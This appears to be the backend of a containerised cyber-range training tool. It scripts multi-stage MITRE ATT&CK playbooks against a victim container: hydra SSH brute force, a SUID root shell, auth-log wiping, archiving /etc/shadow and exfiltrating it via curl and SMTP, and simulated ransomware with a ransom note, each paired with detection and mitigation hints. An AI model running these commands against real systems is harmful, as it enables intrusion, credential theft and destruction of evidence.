from __future__ import annotations
from security_logging import log_security_event, log_rich_event
import asyncio
import logging
import os
import re
import sys
import time
import json
from collections import defaultdict
from contextlib import asynccontextmanager
from datetime import datetime, timedelta
from typing import Any

import docker
from fastapi import Depends, FastAPI, HTTPException, Request, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from jose import JWTError, jwt
from pydantic import BaseModel

# Ensure database and logging modules are found
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
import database  # noqa: E402
from security_logging import log_security_event  # noqa: E402

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("websecsim")

# --- CONFIGURATION ---
SECRET_KEY = os.environ.get("WEBSECSIM_JWT_SECRET", "change-me-in-production")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = int(os.environ.get("WEBSECSIM_JWT_EXPIRE_MINUTES", "120"))
VICTIM_IMAGE = os.environ.get("WEBSECSIM_VICTIM_IMAGE", "websecsim-victim:ready")
ATTACKER_IMAGE = os.environ.get("WEBSECSIM_ATTACKER_IMAGE", "websecsim-attacker")
NETWORK_NAME = os.environ.get("WEBSECSIM_NETWORK", "websecsim-net")
VICTIM_NAME = os.environ.get("WEBSECSIM_VICTIM_NAME", "websecsim-victim")
ATTACKER_NAME = os.environ.get("WEBSECSIM_ATTACKER_NAME", "websecsim-attacker")
WEBSECSIM_ENABLE_GPU = os.environ.get("WEBSECSIM_ENABLE_GPU", "").lower() in ("1", "true", "yes")

_cors = os.environ.get("WEBSECSIM_CORS_ORIGINS", "http://localhost:5173,http://127.0.0.1:5173")
CORS_ORIGINS = [o.strip() for o in _cors.split(",") if o.strip()]

# MITRE technique id (e.g. T1059, T1087.001)
TECHNIQUE_ID = re.compile(r"^T\d{4}(?:\.\d{1,3})?$")

# Simple per-IP rate limit for /token (login brute-force on the API itself)
_login_attempts: dict[str, list[float]] = defaultdict(list)
_LOGIN_WINDOW_SEC = 60
_LOGIN_MAX_ATTEMPTS = 15

class CommandRequest(BaseModel):
    command: str

def _client_ip(request: Request) -> str:
    if request.client:
        return request.client.host or "unknown"
    return "unknown"

def _rate_limit_login(ip: str) -> None:
    now = time.time()
    window = _login_attempts[ip]
    window[:] = [t for t in window if now - t < _LOGIN_WINDOW_SEC]
    if len(window) >= _LOGIN_MAX_ATTEMPTS:
        log_security_event("login_rate_limited", {"ip": ip})
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail="Too many login attempts. Try again later.",
        )
    window.append(now)

@asynccontextmanager
async def lifespan(_app: FastAPI):
    database.init_db()
    if SECRET_KEY == "change-me-in-production":
        logger.warning("WEBSECSIM_JWT_SECRET is not set; using insecure default.")
    yield

app = FastAPI(lifespan=lifespan)
client = docker.from_env()
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

def _internal_error() -> HTTPException:
    return HTTPException(
        status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
        detail="Internal server error",
    )

# --- AUTHENTICATION HELPER FUNCTIONS ---
def create_access_token(data: dict[str, Any]) -> str:
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

async def get_current_user(token: str = Depends(oauth2_scheme)) -> dict[str, Any]:
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str | None = payload.get("sub")
        role: str | None = payload.get("role")
        if username is None:
            raise credentials_exception
    except JWTError:
        raise credentials_exception
    return {"username": username, "role": role}


# --- ENDPOINTS ---

@app.post("/token")
async def login(request: Request, form_data: OAuth2PasswordRequestForm = Depends()) -> dict[str, Any]:
    ip = _client_ip(request)
    _rate_limit_login(ip)
    try:
        user_data = database.get_user(form_data.username)
        if not user_data:
            log_security_event("login_failed", {"ip": ip, "username": form_data.username, "reason": "unknown_user"})
            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Incorrect credentials")
        
        db_username, db_hash, db_role = user_data
        if not database.verify_password(form_data.password, db_hash):
            log_security_event("login_failed", {"ip": ip, "username": form_data.username, "reason": "bad_password"})
            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Incorrect credentials")
        
        access_token = create_access_token(data={"sub": db_username, "role": db_role})
        log_security_event("login_ok", {"ip": ip, "username": db_username, "role": db_role})
        return {"access_token": access_token, "token_type": "bearer", "role": db_role}
    except HTTPException:
        raise
    except Exception:
        logger.exception("login failed with unexpected error")
        raise _internal_error()


@app.post("/api/system/start")
async def start_system(request: Request, current_user: dict = Depends(get_current_user)) -> dict[str, Any]:
    try:
        # Ensure Custom Network
        try:
            client.networks.get(NETWORK_NAME)
        except docker.errors.NotFound:
            client.networks.create(NETWORK_NAME)

        # START VICTIM (Target)
        try:
            victim = client.containers.get(VICTIM_NAME)
            if victim.status != "running":
                victim.start()
                time.sleep(3)

            logger.info("Applying runtime fixes (VNC + SSH + password) on victim")
            victim.exec_run("rm -rf /tmp/.X1-lock /tmp/.X11-unix /var/run/dbus/pid", detach=False)
            victim.exec_run("mkdir -p /tmp/.X11-unix && chmod 1777 /tmp/.X11-unix", detach=False)
            victim.exec_run("sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config", detach=False)
            victim.exec_run("sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config", detach=False)
            victim.exec_run("bash -c 'echo root:password | chpasswd'", detach=False)
            victim.exec_run("service ssh restart", detach=False)

        except docker.errors.NotFound:
            client.containers.run(
                VICTIM_IMAGE, name=VICTIM_NAME, detach=True,
                network=NETWORK_NAME, hostname="victim-machine",
                ports={"80/tcp": 6081}, environment=["RESOLUTION=1280x720"]
            )
            time.sleep(5)
            try:
                vm = client.containers.get(VICTIM_NAME)
                vm.exec_run("service ssh start", detach=False)
                vm.exec_run("bash -c 'echo root:password | chpasswd'", detach=False)
            except Exception:
                logger.exception("first-boot victim fixup failed")
        
        # START MAIL SINKHOLE (Mailpit)
        try:
            mail = client.containers.get("websecsim-mail")
            if mail.status != "running":
                mail.start()
        except docker.errors.NotFound:
            logger.info("Spawning Mailpit Sinkhole...")
            client.containers.run(
                "axllent/mailpit", 
                name="websecsim-mail", 
                detach=True,
                network=NETWORK_NAME, 
                hostname="mail-sinkhole",
                ports={"8025/tcp": 8025} # Exposes the beautiful Web UI to your localhost
                # SMTP Port 1025 remains internal to the Docker network
            )

        # START ATTACKER
        try:
            attacker = client.containers.get(ATTACKER_NAME)
            if attacker.status != "running":
                attacker.start()
        except docker.errors.NotFound:
            run_kwargs: dict[str, Any] = {
                "image": ATTACKER_IMAGE, "name": ATTACKER_NAME,
                "detach": True, "network": NETWORK_NAME, "tty": True,
            }
            if WEBSECSIM_ENABLE_GPU:
                run_kwargs["device_requests"] = [docker.types.DeviceRequest(count=-1, capabilities=[["gpu"]])]
            client.containers.run(**run_kwargs)

        log_security_event("range_started", {"ip": _client_ip(request), "user": current_user["username"]})
        return {"status": "started", "url": "http://127.0.0.1:6081", "user": current_user["username"]}
    except Exception:
        logger.exception("start_system failed")
        raise _internal_error()


@app.post("/api/system/reset")
async def reset_system(request: Request, current_user: dict = Depends(get_current_user)) -> dict[str, Any]:
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Permission Denied: Admins Only")
    try:
        attacker = client.containers.get(ATTACKER_NAME)
        cmd = "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'rm -f /root/Desktop/HACKED*.txt /home/ubuntu/Desktop/HACKED*.txt && rm -f /tmp/rootbash'"
        attacker.exec_run(f'bash -c {repr(cmd)}')
        log_security_event("range_reset", {"ip": _client_ip(request), "user": current_user["username"]})
        return {"status": "success", "message": "System Reset: Artifacts removed."}
    except Exception:
        logger.exception("reset_system failed")
        raise _internal_error()

@app.post("/api/system/exec")
async def execute_web_command(req: CommandRequest, current_user: dict = Depends(get_current_user)) -> dict[str, Any]:
    """Executes an arbitrary shell command directly inside the VICTIM container from the UI terminal."""
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Permission Denied: Admins Only")
    try:
        # CHANGED TO TARGET THE VICTIM MACHINE
        container = client.containers.get(VICTIM_NAME)
        exit_code, output = container.exec_run(["/bin/sh", "-c", req.command])
        log_security_event("c2_command_executed", {"user": current_user["username"], "command": req.command})
        return {"output": output.decode("utf-8", errors="replace")}
    except Exception as e:
        return {"error": f"Failed to execute: {str(e)}"}

@app.post("/api/attack/scan")
async def run_scan(request: Request, current_user: dict = Depends(get_current_user)) -> dict[str, Any]:
    try:
        attacker = client.containers.get(ATTACKER_NAME)
        cmd = "/usr/bin/nmap -F victim-machine"
        result = attacker.exec_run(cmd)
        log_security_event("attack_scan", {"ip": _client_ip(request), "user": current_user["username"]})
        return {"status": "success", "scan_output": result.output.decode(errors="replace")}
    except Exception:
        logger.exception("run_scan failed")
        raise _internal_error()
    
class CampaignRequest(BaseModel):
    campaign_name: str

@app.post("/api/campaign/run")
async def execute_campaign(req: CampaignRequest, current_user: dict = Depends(get_current_user)) -> dict[str, Any]:
    """Executes multi-stage, realistic attack campaigns based on the requested playbook."""
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Permission Denied")
    
    attacker = client.containers.get(ATTACKER_NAME)
    
    # --- CAMPAIGN LIBRARY ---
    playbooks = {
        "Web-to-Root Playbook": [
            {
                "phase": "RECONNAISSANCE", "t_code": "T1046",
                "action": "Attacker scanning victim subnet for exposed services.",
                "cmd": "/usr/bin/nmap -p 22,80 -sV victim-machine",
                "detection": "Watch for rapid SYN packets to multiple ports.",
                "mitigation": "Implement internal network segmentation."
            },
            {
                "phase": "INITIAL_ACCESS", "t_code": "T1110",
                "action": "Attacker brute-forcing SSH credentials.",
                "cmd": "/usr/bin/hydra -l root -p password ssh://victim-machine -I -s 22 -f",
                "detection": "Monitor auth.log for excessive 'Failed password' attempts.",
                "mitigation": "Disable password auth. Enforce SSH Keys."
            },
            {
                "phase": "PRIVILEGE_ESCALATION", "t_code": "T1548.001",
                "action": "Attacker compiled a malicious SUID binary.",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash'",
                "detection": "File integrity monitoring (FIM) detects new SUID binaries.",
                "mitigation": "Regularly audit SUID files using 'find / -perm -4000'."
            },
            {
                "phase": "DEFENSE_EVASION", "t_code": "T1070.004",
                "action": "Attacker wiped authentication logs to cover tracks.",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'echo \"\" > /var/log/auth.log'",
                "detection": "Log forwarder detects sudden drop in event volume.",
                "mitigation": "Forward logs instantly to a remote, immutable SIEM."
            }
        ],
        
        "Data Exfiltration (Insider Threat)": [
            {
                "phase": "DISCOVERY", "t_code": "T1082",
                "action": "Attacker enumerating system and network configuration.",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'uname -a && id && netstat -tuln'",
                "detection": "Sudden execution of enumeration commands (uname, netstat) by a standard user account.",
                "mitigation": "Restrict access to networking utilities via AppArmor/SELinux."
            },
            {
                "phase": "COLLECTION", "t_code": "T1119",
                "action": "Attacker archiving sensitive configuration files (/etc, /var/log).",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'tar -czf /tmp/exfil_data.tar.gz /etc/passwd /etc/shadow 2>/dev/null'",
                "detection": "Auditd alerts on read access to /etc/shadow or creation of large archives in /tmp.",
                "mitigation": "Enforce strict file permissions on sensitive directories."
            },
            {
                "phase": "EXFILTRATION", "t_code": "T1048",
                "action": "Attacker attempting to exfiltrate archive via alternative protocol (curl).",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'curl -X POST -d @/tmp/exfil_data.tar.gz http://172.18.0.3:8000 || echo \"Exfil Simulated\"'",
                "detection": "Network monitor detects large outbound POST requests to unknown external IPs.",
                "mitigation": "Implement egress filtering on firewalls; block outbound HTTP from internal servers."
            },
            {
                "phase": "DEFENSE_EVASION", "t_code": "T1070.004",
                "action": "Attacker deleting the staging archive to remove evidence.",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'rm -f /tmp/exfil_data.tar.gz'",
                "detection": "High-frequency file deletion in staging directories.",
                "mitigation": "Implement filesystem auditing on world-writable directories."
            }
        ],
        "Ransomware Deployment": [
            {
                "phase": "EXECUTION", "t_code": "T1059.004",
                "action": "Attacker dropping ransomware payload onto victim machine.",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'echo \"Ransomware Payload Staged\" > /tmp/encrypt.log'",
                "detection": "Creation of suspicious log files in /tmp.",
                "mitigation": "Mount /tmp directory with the noexec flag."
            },
            {
                "phase": "IMPACT", "t_code": "T1486",
                "action": "Attacker encrypting files on the user's Desktop.",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'for f in /root/Desktop/*; do if [ -f \"$f\" ]; then mv \"$f\" \"$f.LOCKED\"; fi; done'",
                "detection": "Rapid, massive file renaming or modification events in user directories.",
                "mitigation": "Deploy behavioral ransomware protection and maintain offline backups."
            },
            {
                "phase": "IMPACT", "t_code": "T1491",
                "action": "Attacker dropping GUI Ransomware Note.",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'export DISPLAY=:0 && echo \"ALL YOUR FILES ARE ENCRYPTED. SEND 1 BTC TO UNLOCK.\" > /root/Desktop/RANSOM_NOTE.txt && xfce4-terminal --maximize --title=\"SYSTEM COMPROMISED\" -x bash -c \"cat /root/Desktop/RANSOM_NOTE.txt; read\" &'",
                "detection": "Unexpected graphical prompts spawned from SSH sessions.",
                "mitigation": "Restrict X11 forwarding and local display access."
            }
        ],
        "Advanced Exfiltration (Email & Shred)": [
            {
                "phase": "COLLECTION", "t_code": "T1074.001",
                "action": "Attacker staging sensitive data (PII & Financials) into an archive.",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'mkdir -p /tmp/exfil && echo \"user:admin,pass:secret\" > /tmp/exfil/creds.txt && echo \"Q1_Revenue:5M\" > /tmp/exfil/financials.csv && tar -czf /tmp/payload.tar.gz -C /tmp/exfil .'",
                "detection": "File Integrity Monitoring (FIM) detects unexpected archive creation (.tar.gz) in /tmp.",
                "mitigation": "Restrict read access to sensitive directories; monitor abnormal file aggregation."
            },
            {
                "phase": "EXFILTRATION", "t_code": "T1048.003",
                "action": "Attacker exfiltrating archive via automated SMTP (Email) script.",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'python3 -c \"import smtplib; from email.message import EmailMessage; msg=EmailMessage(); msg.set_content(\\\"ATTACHMENT: Data.tar.gz\\\\n\\\\nContains extracted PII and Financial data.\\\"); msg[\\\"Subject\\\"]=\\\"Exfiltrated Data\\\"; msg[\\\"From\\\"]=\\\"victim@websecsim.net\\\"; msg[\\\"To\\\"]=\\\"suryansh.sharma.work1@gmail.com\\\"; s=smtplib.SMTP(\\\"websecsim-mail\\\", 1025); s.send_message(msg); s.quit()\"'",
                "detection": "Network monitoring detects unauthorized outbound traffic on SMTP ports (25, 465, 587).",
                "mitigation": "Block outbound SMTP traffic at the firewall for all non-mail servers."
            },
            {
                "phase": "DEFENSE_EVASION", "t_code": "T1070.004",
                "action": "Attacker shredding evidence and clearing bash history.",
                "cmd": "sshpass -p password ssh -o StrictHostKeyChecking=no root@victim-machine 'shred -uz /tmp/payload.tar.gz /tmp/mail.py && rm -rf /tmp/exfil && history -c'",
                "detection": "Process monitoring logs execution of the `shred` utility.",
                "mitigation": "Audit usage of secure deletion tools. Ship bash_history to SIEM in real-time."
            }
        ],
    }
    
    if req.campaign_name not in playbooks:
        raise HTTPException(status_code=400, detail="Campaign not found")

    selected_playbook = playbooks[req.campaign_name]
    log_rich_event("system", "CAMPAIGN_START", f"Initiating campaign: {req.campaign_name}", metadata={"user": current_user["username"]})

    # Orchestration Loop
    async def run_playbook():
        for step in selected_playbook:
            log_rich_event(
                actor="attacker",
                phase=step["phase"],
                action_desc=step["action"],
                mitre_t_code=step["t_code"],
                raw_command=step["cmd"],
                detection_hint=step["detection"],
                mitigation_hint=step["mitigation"]
            )
            # 🚨 FIX: Pass command as an array to bypass bash string destruction
            attacker.exec_run(["/bin/bash", "-c", step["cmd"]])
            await asyncio.sleep(4) # Simulate human delay
            
        log_rich_event("system", "CAMPAIGN_COMPLETE", f"Campaign '{req.campaign_name}' finished successfully.")

    asyncio.create_task(run_playbook())
    return {"status": "success", "message": f"{req.campaign_name} orchestrated and running."}

@app.get("/api/telemetry/events")
async def get_telemetry_events(current_user: dict = Depends(get_current_user)) -> dict[str, Any]:
    """Serves the structured campaign telemetry to the Blue Team UI."""
    events = []
    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs", "security_events.jsonl")
    
    if os.path.exists(log_path):
        with open(log_path, "r", encoding="utf-8") as f:
            for line in f:
                if line.strip():
                    try:
                        events.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue
                        
    # Reverse the events so the newest are at the top of the timeline
    return {"events": events[::-1]}

@app.post("/api/attack/{t_code}")
async def execute_t_code(t_code: str, request: Request, current_user: dict = Depends(get_current_user)) -> dict[str, Any]:
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Permission Denied: Admins Only")
    if not TECHNIQUE_ID.match(t_code):
        raise HTTPException(status_code=400, detail="Invalid MITRE technique identifier")
    
    try:
        attacker = client.containers.get(ATTACKER_NAME)

        # -- LOCAL ATTACKS (Run on Attacker targeting Victim) --
        if t_code.startswith("T1110"):
            cmd = "/usr/bin/hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://victim-machine -I -s 22 -f"
            logger.info("Executing local attack (Hydra) for %s", t_code)
            result = attacker.exec_run(f'bash -c {repr(cmd)}')
            log_security_event("attack_executed", {"ip": _client_ip(request), "user": current_user["username"], "t_code": t_code, "method": "Hardcoded (Hydra)"})
            return {"status": "success", "method": "Hardcoded (Hydra)", "t_code": t_code, "command": cmd, "output": result.output.decode(errors="replace")}
        
        if t_code == "T1046":
            cmd = "/usr/bin/nmap -sV -O victim-machine"
            logger.info("Executing local attack (Nmap Discovery) for %s", t_code)
            result = attacker.exec_run(f'bash -c {repr(cmd)}')
            log_security_event("attack_executed", {"ip": _client_ip(request), "user": current_user["username"], "t_code": t_code, "method": "Hardcoded (Nmap)"})
            return {"status": "success", "method": "Hardcoded (Nmap)", "t_code": t_code, "command": cmd, "output": result.output.decode(errors="replace")}

        # -- REMOTE ATTACKS (Pushed to Victim via SSH) --
        # -- REMOTE ATTACKS (Pushed to Victim via SSH) --
        if t_code == "T1059":
            real_command = (
                "export DISPLAY=:0 && "
                "mkdir -p /root/Desktop && "
                "touch /root/Desktop/HACKED_BY_ADMIN.txt && "
                "xfce4-terminal --maximize --title='CRITICAL ALERT' -x bash -c 'echo SYSTEM COMPROMISED; echo PERSISTENCE ACHIEVED VIA T1059; read' &"
            )
            method = "Hardcoded (Persistence + GUI Injection)"
        elif t_code == "T1070.004":
            real_command = "echo '' > /var/log/auth.log && echo '' > /var/log/btmp && echo 'LOGS WIPED'"
            method = "Hardcoded (Defense Evasion)"
        elif t_code == "T1548.001":
            real_command = "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash && ls -la /tmp/rootbash"
            method = "Hardcoded (Privilege Escalation)"
        else:
            # Fallback to dynamic payload loader for T1087.001 and others
            fetch_cmd = f"python3 payload_loader.py {t_code}"
            fetch_result = attacker.exec_run(fetch_cmd)
            output_str = fetch_result.output.decode(errors="replace").strip()
            if "ERROR" in output_str or fetch_result.exit_code != 0:
                raise HTTPException(status_code=404, detail=f"Could not load T-Code: {output_str}")
            real_command = output_str.split("\n")[-1]
            method = "Dynamic YAML Parsing"

        logger.info("Sending payload via SSH for %s", t_code)
        ssh_wrapper = ["sshpass", "-p", "password", "ssh", "-o", "StrictHostKeyChecking=no", "root@victim-machine", real_command]
        result = attacker.exec_run(ssh_wrapper)
        
        log_security_event("attack_executed", {"ip": _client_ip(request), "user": current_user["username"], "t_code": t_code, "method": method})
        return {"status": "success", "method": method, "t_code": t_code, "command": real_command, "output": result.output.decode(errors="replace")}

    except HTTPException:
        raise
    except Exception:
        logger.exception("execute_t_code failed")
        raise _internal_error()